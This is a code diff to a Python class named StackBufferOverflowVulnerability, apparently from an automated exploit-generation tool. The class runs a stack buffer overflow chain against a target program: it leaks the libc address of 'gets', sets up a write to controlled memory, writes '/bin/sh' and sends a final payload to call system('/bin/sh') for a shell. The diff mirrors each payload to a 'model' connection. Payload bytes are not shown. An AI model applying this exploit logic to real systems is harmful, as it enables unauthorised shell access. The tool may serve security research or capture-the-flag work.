@@ -152,7 +152,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
             logger.info("Using provided intial value to clear stdout")
             sconn.recvuntil(self.initial)
         else:
-            logger.info("Navigating to targetFunc.")
+            logger.info("Navigating to invocation of target input function.")
             conn.navigate(self.targetFunc)
 
         res = sconn.recv()
@@ -161,6 +161,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         # read libc location
         logger.info("Sending first payload (to leak 'gets' location)")
         sconn.sendline(payload1)
+        conn.model.sendline(payload1)
 
         # Need to perform drain of non libc stuff
         if self.suffix:
@@ -197,7 +198,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         
         logger.info("Sending second payload (setup write to controlled memory)")
         sconn.sendline(payload2)
-        # TODO: We need to also send this to the model.
+        conn.model.sendline(payload2) # update model
         logger.info("Navigating to return.")
         if self.suffix:
             logger.info(f"Attempting to receive provided suffix: {suffix}")
@@ -210,8 +211,9 @@ class StackBufferOverflowVulnerability(Vulnerability):
         # we have exited the function, we can now
         # write /bin/sh to a controlled part of memory
         logger.info(f"Writing '/bin/sh' to {hex(target_heap_address)}")
-        sconn.sendline("/bin/sh\x00")
-        # TODO: We need to also send this to the model.
+        bin_sh = b"/bin/sh\x00"
+        sconn.sendline(bin_sh)
+        conn.model.sendline(bin_sh)
 
         # need to navigate back to the targetFunc
         if self.initial:
@@ -232,7 +234,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
 
         logger.info("Sending final payload (invoke system('bin/sh'))")
         sconn.sendline(payload3)
-        # TODO: We need to also send this to the model.
+        conn.model.sendline(payload3)
         
         # Payload sent, now exit the function.
         if self.suffix:
